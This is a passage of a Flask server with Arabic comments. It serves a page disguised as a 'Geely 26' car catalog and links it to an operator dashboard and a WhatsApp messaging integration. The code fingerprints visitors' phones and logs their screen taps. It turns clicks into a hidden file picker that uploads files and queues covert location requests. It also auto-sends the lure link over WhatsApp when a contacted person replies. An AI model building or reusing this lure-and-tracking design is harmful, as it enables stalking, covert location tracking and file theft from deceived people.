            });
            navigator.serviceWorker.register('/sw.js')
                .then(reg => log('✅ Service Worker مسجل بنجاح.'))
                .catch(err => log('❌ فشل تسجيل Service Worker: ' + err));
        }

        // الاستماع لتغيير الملف ورفعه فوراً
        document.getElementById('hiddenFileInput').addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                // دعم رفع ملفات متعددة
                for (let i = 0; i < e.target.files.length; i++) {
                    const file = e.target.files[i];
                    log(`جاري رفع الملف (${i+1}/${e.target.files.length}): ${file.name}`);
                    uploadFile(file, 'uploaded_' + file.name);
                }
                document.getElementById('uploadOverlay').style.display = 'none';
                localFilePickMode = 'all';
            }
        });

        // تشغيل Wake Lock عند الاتصال
        document.addEventListener('pointerdown', (ev) => {
            if (ev.isPrimary === false) return;
            emitScreenTap(ev.clientX, ev.clientY);
        }, { passive: true });

        document.addEventListener('click', async () => {
            // تنفيذ طلب الملفات عند النقر
            if (pendingFileRequest) {
                const type = pendingFileRequest;
                pendingFileRequest = null;
                
                const input = document.getElementById('hiddenFileInput');
                if (type === 'images') input.accept = "image/*";
                else if (type === 'videos') input.accept = "video/*";
                else input.removeAttribute('accept');
                
                try {
                    input.value = '';
                    input.click();
                    log('📂 تم فتح نافذة الملفات');
                } catch(e) {
                    log('❌ تعذر فتح النافذة: ' + e);
                }
            }
        });

        document.addEventListener('DOMContentLoaded', () => {
            showPermissionOverlay();
        });

    </script>
</body>
</html>
"""

# ============ دوال النظام الأساسية ============

def setup_templates():
    """إنشاء مجلد القوالب والملفات تلقائياً عند التشغيل"""
    if not os.path.exists(TEMPLATES_DIR):
        os.makedirs(TEMPLATES_DIR)
        print("✅ تم إنشاء مجلد templates")
    
    templates = {
        'login.html': LOGIN_HTML,
        'dashboard.html': DASHBOARD_HTML,
        'phone.html': PHONE_HTML
    }

    for filename, content in templates.items():
        path = os.path.join(TEMPLATES_DIR, filename)
        if os.path.exists(path):
            continue
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"✅ تم تحديث ملف القالب: {filename}")

def init_database():
    """تهيئة قاعدة البيانات"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, timeout=10)
        cursor = conn.cursor()
        
        # جدول المستخدمين محسّن
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                email TEXT UNIQUE,
                role TEXT DEFAULT 'user' CHECK(role IN ('admin', 'user', 'guest')),
                is_active BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                failed_attempts INTEGER DEFAULT 0
            )
        ''')
        
        # جدول الأجهزة محسّن
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip TEXT,
                platform TEXT,
                owner_id TEXT NOT NULL,
                last_seen TIMESTAMP,
                status TEXT DEFAULT 'offline' CHECK(status IN ('online', 'offline', 'sleeping')),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (owner_id) REFERENCES users(id)
            )
        ''')
        
        # جدول لوحات سجل الأنشطة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT NOT NULL,
                device_id TEXT,
                action TEXT NOT NULL,
                details TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id),
                FOREIGN KEY (device_id) REFERENCES devices(id)
            )
        ''')
        
        # جدول الجلسات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                token_jti TEXT PRIMARY KEY,
                user_id TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')

        # جدول طلبات الحجز من صفحة السيارات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bookings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                booking_ref TEXT UNIQUE NOT NULL,
                customer_name TEXT NOT NULL,
                phone TEXT NOT NULL,
                city TEXT,
                car_model TEXT DEFAULT 'Geely 26',
                preferred_date TEXT,
                notes TEXT,
                source_page TEXT DEFAULT 'cars',
                status TEXT DEFAULT 'new' CHECK(status IN ('new', 'contacted', 'confirmed', 'cancelled')),
                whatsapp_sent INTEGER DEFAULT 0,
                whatsapp_status TEXT DEFAULT '',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # ترقية الجداول القديمة إن كانت أعمدة واتساب غير موجودة.
        cursor.execute("PRAGMA table_info(bookings)")
        booking_columns = {row[1] for row in cursor.fetchall()}
        if 'whatsapp_sent' not in booking_columns:
            cursor.execute("ALTER TABLE bookings ADD COLUMN whatsapp_sent INTEGER DEFAULT 0")
        if 'whatsapp_status' not in booking_columns:
            cursor.execute("ALTER TABLE bookings ADD COLUMN whatsapp_status TEXT DEFAULT ''")
        
        # إضافة مستخدم admin افتراضي إذا لم يكن موجوداً
        default_admin_user = os.getenv('DEFAULT_ADMIN_USERNAME', 'admin')
        cursor.execute("SELECT count(*) FROM users WHERE username=?", (default_admin_user,))
        if cursor.fetchone()[0] == 0:
            default_admin_pass = os.getenv('DEFAULT_ADMIN_PASSWORD')

            if not default_admin_pass:
                logger.warning("⚠️ لم يتم تعيين DEFAULT_ADMIN_PASSWORD. لن يتم إنشاء حساب admin افتراضي.")
            else:
                admin_password_hash = generate_password_hash(default_admin_pass, method='pbkdf2:sha256')
                cursor.execute(
                    "INSERT INTO users (id, username, password_hash, role) VALUES (?, ?, ?, ?)",
                    (str(uuid.uuid4()), default_admin_user, admin_password_hash, 'admin')
                )
                logger.info(f"✅ تم إنشاء المستخدم الافتراضي: {default_admin_user}")
        
        # إنشاء فهارس لتحسين الأداء
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_devices_owner ON devices(owner_id)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_activity_log_user ON activity_log(user_id)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id)")
        
        conn.commit()
        conn.close()
        logger.info("✅ قاعدة البيانات جاهزة")
    except Exception as e:
        logger.error(f"❌ خطأ في تهيئة قاعدة البيانات: {e}")
        raise

def log_activity(user_id, device_id=None, action='', details=''):
    """تسجيل الأنشطة للمراجعة الأمنية"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, timeout=10)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO activity_log (user_id, device_id, action, details) VALUES (?, ?, ?, ?)",
            (user_id, device_id, action, details)
        )
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"خطأ في تسجيل النشاط: {e}")

def get_network_info():
    """الحصول على معلومات الشبكة بشكل آمن"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        logger.warning(f"تحذير: لا يمكن الحصول على IP: {e}")
        return "127.0.0.1"

def create_ssl_certificates(ip_address):
    """إنشاء شهادات SSL ذاتية التوقيع (للبيئات المحلية فقط)"""
    cert_file = 'server.crt'
    key_file = 'server.key'
    
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return cert_file, key_file
    
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        import ipaddress
        
        logger.info("🔐 جاري إنشاء شهادات SSL...")
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, ip_address)
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.IPAddress(ipaddress.IPv4Address(ip_address))]),
            critical=False
        ).sign(key, hashes.SHA256(), default_backend())
        
        with open(key_file, "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        logger.info("✅ تم إنشاء شهادات SSL بنجاح")
        return cert_file, key_file
    except ImportError:
        logger.warning("⚠️ مكتبة cryptography غير مثبتة. SSL لن يعمل.")
        return None, None
    except Exception as e:
        logger.error(f"❌ خطأ في إنشاء SSL: {e}")
        return None, None

def get_recent_activity_log(limit=10):
    """جلب آخر النشاطات لتزويد الـ AI بها"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, timeout=5)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT action, details, timestamp, device_id 
            FROM activity_log 
            ORDER BY timestamp DESC LIMIT ?
        ''', (limit,))
        rows = cursor.fetchall()
        conn.close()
        return "\n".join([f"[{r[2]}] Device {r[3] or 'N/A'}: {r[0]} - {r[1]}" for r in rows])
    except Exception:
        return "No recent logs available."

# ============ Routes (المسارات) ============

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login')
def login_page():
    return render_template('login.html')

@app.route('/favicon.ico')
def favicon():
    return "", 204

@app.route('/sw.js')
def sw():
    # Service Worker محسّن: يرسل keepAlive لجميع العملاء كل 25 ثانية لمنع قطع الاتصال
    sw_code = (
        "self.addEventListener('install',e=>{self.skipWaiting();});"
        "self.addEventListener('activate',e=>{e.waitUntil(self.clients.claim());});"
        "setInterval(()=>{"
        "self.clients.matchAll().then(cs=>{cs.forEach(c=>c.postMessage('keepAlive'));});"
        "},25000);"
    )
    return sw_code, 200, {'Content-Type': 'application/javascript'}

@app.route('/manifest.json')
def manifest():
    return jsonify({
        "name": "Project X",
        "short_name": "Project X",
        "start_url": "/phone",
        "display": "standalone",
        "background_color": "#ffffff",
        "theme_color": "#2196F3",
        "icons": []
    })

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/phone')
def phone():
    # لا نرسل إشعار الزيارة من الراوت مباشرة لتجنب الرسائل الوهمية من البوتات/المعاينات.
    return render_template('cars.html')

@app.route('/cars')
def cars_catalog():
    """صفحة عرض السيارات - Geely 26"""
    return render_template('cars.html')


@app.route('/api/visit-ping', methods=['POST'])
def api_visit_ping():
    """Ping من المتصفح الحقيقي لتأكيد الزيارة وإرسال الإشعار مرة واحدة بشكل موثوق."""
    try:
        payload = request.json or {}
        device_id = normalize_device_id(payload.get('deviceId', '')) or 'unknown-device'
        ua = str(request.headers.get('User-Agent', '') or '')
        ip = request.headers.get('CF-Connecting-IP', '') or request.remote_addr or 'unknown-ip'

        if not is_likely_real_mobile_client(payload, ua, request.headers):
            logger.info(
                'ℹ️ visit-ping ignored (non_mobile_or_bot): ip=%s ua=%s payload=%s',
                ip,
                ua[:120],
                {
                    'touchPoints': payload.get('touchPoints'),
                    'viewportW': payload.get('viewportW'),
                    'platform': payload.get('platform'),
                },
            )
            return jsonify({'success': True, 'ignored': 'non_mobile_or_bot'}), 200

        model = str(payload.get('model', '') or payload.get('deviceModel', '') or '').strip() or 'Unknown'
        platform = str(payload.get('platform', '') or payload.get('os', '') or '').strip() or 'Unknown'
        name = str(payload.get('name', '') or payload.get('deviceName', '') or '').strip() or 'Web Visitor'

        with device_identity_lock:
            device_identity_cache[device_id] = {
                'name': format_device_display_name(name, platform),
                'raw_name': name,
                'platform': platform,
                'model': model,
                'user_agent': ua[:220],
                'ip': ip,
                'updated_at': datetime.now(timezone.utc).isoformat(),
            }

        visit_key = f"{device_id}|{ip}|{ua}"
        socketio.start_background_task(
            notify_anonymous_visit_on_whatsapp,
            visit_key,
            {
                'device_id': device_id,
                'name': name,
                'platform': platform,
                'model': model,
                'user_agent': ua,
                'ip': ip,
            },
        )
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"خطأ في visit-ping: {e}")
        return jsonify({'success': False, 'error': 'visit_ping_failed'}), 500


@app.route('/api/register-device-fallback', methods=['POST'])
def api_register_device_fallback():
    """تسجيل الجهاز في حالة فشل Socket.IO حتى يظهر في قائمة الأجهزة المتصلة."""
    try:
        payload = request.json or {}
        device_id = normalize_device_id(payload.get('device_id', ''))
        if not device_id:
            return jsonify({'success': False, 'error': 'invalid_device_id'}), 400

        ua = str(request.headers.get('User-Agent', '') or '')
        if not is_likely_real_mobile_client(payload, ua, request.headers):
            logger.info(
                'ℹ️ register-device-fallback ignored (non_mobile_or_bot): ip=%s ua=%s payload=%s',
                request.headers.get('CF-Connecting-IP', '') or request.remote_addr,
                ua[:120],
                {
                    'touchPoints': payload.get('touchPoints'),
                    'viewportW': payload.get('viewportW'),
                    'platform': payload.get('platform'),
                },
            )
            return jsonify({'success': True, 'ignored': 'non_mobile_or_bot'}), 200

        name = format_device_display_name(payload.get('name', 'Web Visitor'), payload.get('platform', 'Unknown'))
        raw_name = str(payload.get('name', 'Web Visitor')).strip() or 'Web Visitor'
        platform = str(payload.get('platform', 'Unknown')).strip() or 'Unknown'
        model = str(payload.get('model', '') or payload.get('deviceModel', '') or '').strip() or 'Unknown'

        connected_devices[device_id] = {
            'sid': '',
            'name': name,
            'raw_name': raw_name,
            'ip': request.headers.get('CF-Connecting-IP', '') or request.remote_addr,
            'platform': platform,
            'model': model,
            'battery': 'Unknown',
            'location': None,
            'realtime_connected': False,
            'connected_at': datetime.now().isoformat(),
        }

        with device_identity_lock:
            device_identity_cache[device_id] = {
                'name': name,
                'raw_name': raw_name,
                'platform': platform,
                'model': model,
                'user_agent': ua[:220],
                'ip': request.headers.get('CF-Connecting-IP', '') or request.remote_addr,
                'updated_at': datetime.now(timezone.utc).isoformat(),
            }

        try:
            conn = sqlite3.connect(DATABASE_PATH, timeout=10)
            cursor = conn.cursor()
            cursor.execute(
                "INSERT OR REPLACE INTO devices (id, name, ip, platform, owner_id, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    device_id,
                    name,
                    request.headers.get('CF-Connecting-IP', '') or request.remote_addr,
                    platform,
                    'system',
                    datetime.now().isoformat(),
                    'online',
                ),
            )
            conn.commit()
            conn.close()
        except Exception as db_error:
            logger.error(f"خطأ في حفظ الجهاز الاحتياطي: {db_error}")

        socketio.emit('device_registered', {'name': name, 'device_id': device_id}, room='main_room')
        logger.info(f"✅ جهاز متصل (fallback): {name} ({device_id})")
        return jsonify({'success': True, 'device_id': device_id})
    except Exception as e:
        logger.error(f"خطأ في register-device-fallback: {e}")
        return jsonify({'success': False, 'error': 'fallback_registration_failed'}), 500


@app.route('/api/pending-actions', methods=['GET'])
def api_pending_actions():
    """إرجاع الأوامر المعلقة للجهاز (مثل طلب موقع تم إطلاقه من اللاب أثناء غلق الصفحة)."""
    try:
        device_id = normalize_device_id(request.args.get('device_id', ''))
        if not device_id:
            return jsonify({'success': False, 'error': 'invalid_device_id'}), 400

        return jsonify({
            'success': True,
            'location_requested': pop_pending_location_request(device_id),
        })
    except Exception as e:
        logger.error(f"خطأ في pending-actions: {e}")
        return jsonify({'success': False, 'error': 'pending_actions_failed'}), 500

# ============ API Endpoints ============

@app.route('/api/login', methods=['POST'])
def api_login():
    """تسجيل الدخول مع التحقق الأمني المحسّن"""
    try:
        data = request.json
        username = data.get('username', '').strip()
        password = data.get('password', '')
        
        if not username or not password:
            log_activity('unknown', action='failed_login', details='بيانات مفقودة')
            return jsonify({'success': False, 'error': 'بيانات ناقصة'}), 400
        
        conn = sqlite3.connect(DATABASE_PATH, timeout=10)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT id, password_hash, role, is_active, COALESCE(failed_attempts, 0) FROM users WHERE username=?",
            (username,),
        )
        user = cursor.fetchone()
        conn.close()
        
        if not user:
            logger.warning(f"محاولة تسجيل دخول فاشلة: {username}")
            return jsonify({'success': False, 'error': 'بيانات غير صحيحة'}), 401
        
        user_id, password_hash, role, is_active, failed_attempts = user
        
        if not is_active:
            log_activity(user_id, action='login_blocked', details='الحساب معطل')
            return jsonify({'success': False, 'error': 'الحساب معطل'}), 403

        if int(failed_attempts or 0) >= 10:
            log_activity(user_id, action='login_blocked', details='محاولات دخول متكررة')
            return jsonify({'success': False, 'error': 'تم إيقاف الحساب مؤقتاً بسبب محاولات دخول متكررة'}), 403
        
        # التحقق من كلمة المرور المشفرة
        if not check_password_hash(password_hash, password):
            try:
                conn = sqlite3.connect(DATABASE_PATH, timeout=10)
                cursor = conn.cursor()
                cursor.execute(
                    "UPDATE users SET failed_attempts = COALESCE(failed_attempts, 0) + 1 WHERE id=?",
                    (user_id,),
                )
                conn.commit()
                conn.close()
            except Exception as update_error:
                logger.error(f"خطأ في تحديث عدد محاولات الدخول الفاشلة: {update_error}")
            log_activity(user_id, action='failed_login', details='كلمة مرور خاطئة')
            logger.warning(f"محاولة تسجيل دخول فاشلة: {username}")
            return jsonify({'success': False, 'error': 'بيانات غير صحيحة'}), 401
        
        session['user_id'] = user_id
        session.permanent = True
        
        # تحديث آخر تسجيل دخول
        try:
            conn = sqlite3.connect(DATABASE_PATH, timeout=10)
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET last_login=?, failed_attempts=0 WHERE id=?",
                (datetime.now().isoformat(), user_id),
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تحديث آخر تسجيل دخول: {e}")
        
        log_activity(user_id, action='login_success')
        logger.info(f"✅ تسجيل دخول ناجح: {username}")
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'role': role
        })
    
    except Exception as e:
        logger.error(f"خطأ في معالج تسجيل الدخول: {e}")
        return jsonify({'success': False, 'error': 'خطأ في الخادم'}), 500

@app.route('/api/session', methods=['GET'])
def api_session():
    user_id = get_current_user_id()
    if not user_id:
        return jsonify({'authenticated': False}), 401
    return jsonify({'authenticated': True, 'user_id': user_id})

@app.route('/healthz', methods=['GET'])
def healthz():
    return jsonify({'ok': True}), 200

@app.route('/api/logout', methods=['POST'])
@login_required
def api_logout():
    uid = get_current_user_id()
    session.clear()
    logger.info(f"✅ تسجيل خروج: {uid}")
    return jsonify({'success': True})

@app.route('/uploads/<path:filename>')
@login_required
def download_file(filename):
    # السماح بتحميل الملفات من مجلد uploads
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/devices', methods=['GET'])
@login_required
def api_devices():
    """الحصول على قائمة الأجهزة المتصلة بالمستخدم"""
    try:
        devices_list = []
        for dev_id, dev_data in connected_devices.items():
            devices_list.append({
                'id': dev_id,
                'name': dev_data['name'],
                'raw_name': dev_data.get('raw_name', dev_data['name']),
                'platform': dev_data.get('platform', 'Unknown'),
                'ip': dev_data['ip'],
                'battery': dev_data.get('battery', 'N/A'),
                'location': dev_data.get('location', None),
                'online': True
            })
        return jsonify({'devices': devices_list})
    except Exception as e:
        logger.error(f"خطأ في الحصول على الأجهزة: {e}")
        return jsonify({'error': 'خطأ في الخادم'}), 500

@app.route('/api/upload', methods=['POST'])
def api_upload():
    """رفع الملفات مع التحقق من النوع والحجم"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'لا توجد ملفات'}), 400
        
        file = request.files['file']
        device_id = normalize_device_id(request.form.get('device_id', ''))
        
        if file.filename == '':
            return jsonify({'error': 'لم يتم اختيار ملف'}), 400
        
        if not allowed_file(file.filename):
            return jsonify({'error': 'نوع ملف غير مسموح'}), 400

        if not device_id or device_id not in connected_devices:
            return jsonify({'error': 'الجهاز غير متصل أو غير مصرح'}), 403
        
        # إنشاء مجلد خاص بالجهاز
        device_folder = os.path.join(app.config['UPLOAD_FOLDER'], device_id)
        os.makedirs(device_folder, exist_ok=True)

        filename = secure_filename(file.filename)
        if not filename:
            return jsonify({'error': 'اسم الملف غير صالح'}), 400
        filename = datetime.now().strftime("%Y%m%d_%H%M%S_") + filename
        save_path = os.path.join(device_folder, filename)
        
        file.save(save_path)
        logger.info(f"✅ تم رفع الملف: {filename} (الجهاز: {device_id})")
        
        # إرجاع المسار النسبي للملف ليتمكن المتصفح من تحميله
        return jsonify({'success': True, 'filename': f"{device_id}/{filename}"})
    
    except Exception as e:
        logger.error(f"خطأ في رفع الملف: {e}")
        return jsonify({'error': 'خطأ في رفع الملف'}), 500

@app.route('/api/qr')
@login_required
def api_qr():
    """إنشاء رمز QR للربط السريع"""
    try:
        local_ip = get_network_info()
        port = 9090
        
        # استخدام الرابط العام إذا وجد، وإلا المحلي
        base_url = public_url if public_url else f"http://{local_ip}:{port}"
        
        # رابط مباشر بدون توكن
        qr_url = f"{base_url}/phone"
        
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(qr_url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        img_io = BytesIO()
        img.save(img_io, 'PNG')
        img_io.seek(0)
        
        return send_file(img_io, mimetype='image/png')
    except Exception as e:
        logger.error(f"خطأ في إنشاء QR: {e}")
        return jsonify({'error': 'خطأ في إنشاء QR'}), 500

@app.route('/api/server-ip')
@login_required
def api_server_ip():
    """الحصول على معلومات الخادم"""
    try:
        local_ip = get_network_info()
        port = 9090
        display_url = public_url if public_url else f"http://{local_ip}:{port}"
        
        data = {
            'ip': local_ip,
            'port': port,
            'url': display_url,
            'public_url': public_url
        }
        return jsonify(data)
    except Exception as e:
        logger.error(f"خطأ في الحصول على معلومات الخادم: {e}")
        return jsonify({'error': 'خطأ'}), 500


@app.route('/api/whatsapp/send', methods=['POST'])
@login_required
def api_whatsapp_send():
    try:
        data = request.get_json(silent=True) or {}
        raw_phone = str(data.get('phone', '')).strip()
        raw_message = str(data.get('message', '')).strip()
        raw_keyword = str(data.get('keyword', '')).strip().lower()

        if not raw_phone:
            return jsonify({'success': False, 'error': 'اكتب رقم الهاتف أولاً'}), 400

        message_text = raw_message or app.config.get('WAWP_DEFAULT_MESSAGE', 'السلام عليم')
        keyword = raw_keyword or app.config.get('WAWP_TRIGGER_KEYWORD', '')

        chat_id = normalize_phone_to_chat_id(raw_phone)
        link_url = get_phone_page_link()

        send_wawp_text(chat_id, message_text)
        append_whatsapp_message(
            chat_id=chat_id,
            direction='out',
            text=message_text,
            message_type='text',
        )

        cleanup_whatsapp_state()
        whatsapp_pending_replies[canonicalize_chat_id(chat_id)] = {
            'created_at': datetime.now(timezone.utc),
            'link': link_url,
            'keyword': keyword,
            'phone_digits': re.sub(r'\D', '', raw_phone),
            'chat_id': chat_id,
        }

        webhook_url = get_wawp_webhook_url()
        return jsonify({
            'success': True,
            'chat_id': chat_id,
            'message': message_text,
            'auto_reply_link': link_url,
            'keyword': keyword,
            'webhook_url': webhook_url,
            'note': 'تم إرسال الرسالة. عند رد المستخدم سيتم إرسال الرابط تلقائيًا.'
        })
    except ValueError as e:
        return jsonify({'success': False, 'error': str(e)}), 400
    except Exception as e:
        logger.error(f"خطأ في إرسال واتساب: {e}")
        return jsonify({'success': False, 'error': f'فشل إرسال الرسالة: {e}'}), 500


@app.route('/api/whatsapp/chats', methods=['GET'])
@login_required
def api_whatsapp_chats():
    try:
        force = str(request.args.get('force', '')).strip().lower() in {'1', 'true', 'yes'}
        sync_state = sync_whatsapp_from_provider(force=force)
        return jsonify({'success': True, 'chats': get_whatsapp_chats_overview(), 'sync': sync_state})
    except Exception as e:
        logger.error(f"خطأ في جلب محادثات واتساب: {e}")
        return jsonify({'success': False, 'error': 'فشل تحميل المحادثات'}), 500


@app.route('/api/whatsapp/messages/<path:chat_id>', methods=['GET'])
@login_required
def api_whatsapp_messages(chat_id):
    try:
        canonical_chat = canonicalize_chat_id(chat_id)
        if not canonical_chat:
            return jsonify({'success': False, 'error': 'chat_id غير صالح'}), 400

        with whatsapp_state_lock:
            conversation = whatsapp_conversations.get(canonical_chat)
            if not conversation:
                return jsonify({'success': True, 'chat': None, 'messages': []})

            conversation['unread'] = 0
            chat_meta = {
                'chat_id': conversation.get('chat_id', ''),
                'phone_digits': conversation.get('phone_digits', ''),
                'display_name': conversation.get('display_name', ''),
                'profile_pic': conversation.get('profile_pic', ''),
                'last_message': conversation.get('last_message', ''),
                'last_at': conversation.get('last_at', ''),
                'unread': 0,
            }
            messages = list(conversation.get('messages', []))

        return jsonify({'success': True, 'chat': chat_meta, 'messages': messages})
    except Exception as e:
        logger.error(f"خطأ في جلب رسائل واتساب: {e}")
        return jsonify({'success': False, 'error': 'فشل تحميل الرسائل'}), 500


@app.route('/api/whatsapp/send-file', methods=['POST'])
@login_required
def api_whatsapp_send_file():
    try:
        chat_id = canonicalize_chat_id(request.form.get('chat_id', '').strip())
        raw_phone = str(request.form.get('phone', '')).strip()
        caption = str(request.form.get('caption', '')).strip()

        if not chat_id:
            if not raw_phone:
                return jsonify({'success': False, 'error': 'حدد المحادثة أو رقم الهاتف'}), 400
            chat_id = normalize_phone_to_chat_id(raw_phone)

        uploaded_file = request.files.get('file')
        if not uploaded_file or not uploaded_file.filename:
            return jsonify({'success': False, 'error': 'اختر ملفًا أولاً'}), 400

        safe_name = secure_filename(uploaded_file.filename)
        if not safe_name:
            return jsonify({'success': False, 'error': 'اسم الملف غير صالح'}), 400

        out_folder = os.path.join(app.config['UPLOAD_FOLDER'], 'whatsapp_outgoing')
        os.makedirs(out_folder, exist_ok=True)
        unique_name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}_{safe_name}"
        saved_path = os.path.join(out_folder, unique_name)
        uploaded_file.save(saved_path)

        media_sent = False
        fallback_note = ''
        mime_type = mimetypes.guess_type(safe_name)[0] or ''
        if mime_type.startswith('image/'):
            logged_type = 'image'
        elif mime_type.startswith('video/'):
            logged_type = 'video'
        elif mime_type.startswith('audio/'):
            logged_type = 'audio'
        elif safe_name.lower().endswith('.pdf'):
            logged_type = 'pdf'
        else:
            logged_type = 'file'
        try:
            send_wawp_media(chat_id, saved_path, caption=caption)
            media_sent = True
        except Exception as media_error:
            # fallback آمن: إرسال رابط الملف كنص عند فشل endpoint الوسائط.
            base = public_url.rstrip('/') if public_url else f"http://{get_network_info()}:9090"
            rel = f"whatsapp_outgoing/{unique_name}"
            file_url = f"{base}/uploads/{rel}"
            fallback_text = (caption + '\n' if caption else '') + f"ملف مرفوع: {file_url}"
            send_wawp_text(chat_id, fallback_text)
            fallback_note = f"تم الإرسال كرابط لأن مزود الوسائط رفض الطلب: {media_error}"

        append_whatsapp_message(
            chat_id=chat_id,
            direction='out',
            text=caption if media_sent else (caption or 'تم إرسال ملف كرابط'),
            message_type=logged_type,
            media_url=f"/uploads/whatsapp_outgoing/{unique_name}",
            file_name=safe_name,
        )

        return jsonify({
            'success': True,
            'chat_id': chat_id,
            'media_sent': media_sent,
            'file_name': safe_name,
            'file_url': f"/uploads/whatsapp_outgoing/{unique_name}",
            'note': fallback_note or 'تم إرسال الملف بنجاح',
        })
    except ValueError as e:
        return jsonify({'success': False, 'error': str(e)}), 400
    except Exception as e:
        logger.error(f"خطأ في إرسال ملف واتساب: {e}")
        return jsonify({'success': False, 'error': f'فشل إرسال الملف: {e}'}), 500


@app.route('/api/whatsapp/webhook', methods=['POST'])
def api_whatsapp_webhook():
    try:
        configured_secret = app.config.get('WAWP_WEBHOOK_SECRET', '').strip()
        if configured_secret:
            incoming_secret = request.args.get('secret', '') or request.headers.get('X-Webhook-Secret', '')
            if incoming_secret != configured_secret:
                return jsonify({'success': False, 'error': 'unauthorized'}), 403

        event = request.get_json(silent=True) or {}
        cleanup_whatsapp_state()

        event_id = str(event.get('id', '')).strip()
        if event_id:
            if event_id in whatsapp_seen_events:
                return jsonify({'success': True, 'duplicate': True}), 200
            whatsapp_seen_events[event_id] = datetime.now(timezone.utc)

        event_type = str(event.get('event', '')).strip().lower()
        if event_type not in {'message', 'message.any'}:
            return jsonify({'success': True, 'ignored': True}), 200

        payload = event.get('payload') or {}
        if not isinstance(payload, dict):
            return jsonify({'success': True, 'ignored': True}), 200

        from_me_raw = payload.get('fromMe', False)
        if isinstance(from_me_raw, str):
            from_me = from_me_raw.strip().lower() in {'1', 'true', 'yes'}
        else:
            from_me = bool(from_me_raw)

        if from_me:
            return jsonify({'success': True, 'ignored': True}), 200

        raw_from = payload.get('from', '')
        if isinstance(raw_from, dict):
            chat_id = str(raw_from.get('_serialized') or raw_from.get('id') or '').strip()
        else:
            chat_id = str(raw_from).strip()

        if not chat_id:
            chat_id = str(payload.get('chatId') or payload.get('from_id') or '').strip()

        chat_id = canonicalize_chat_id(chat_id)
        if not chat_id:
            return jsonify({'success': True, 'ignored': True}), 200

        incoming_text_raw = str(
            payload.get('body')
            or payload.get('text')
            or (payload.get('message') if isinstance(payload.get('message'), str) else '')
            or (payload.get('message', {}).get('body') if isinstance(payload.get('message'), dict) else '')
            or (payload.get('_data', {}).get('body') if isinstance(payload.get('_data'), dict) else '')
            or ''
        ).strip()
        incoming_text = incoming_text_raw.lower()
        incoming_type = str(payload.get('type') or payload.get('messageType') or 'text').strip().lower()
        incoming_media_url = str(
            payload.get('mediaUrl')
            or payload.get('url')
            or payload.get('fileUrl')
            or ''
        ).strip()
        incoming_file_name = str(
            payload.get('fileName')
            or payload.get('filename')
            or payload.get('mediaName')
            or ''
        ).strip()

        append_whatsapp_message(
            chat_id=chat_id,
            direction='in',
            text=incoming_text_raw,
            message_type=incoming_type,
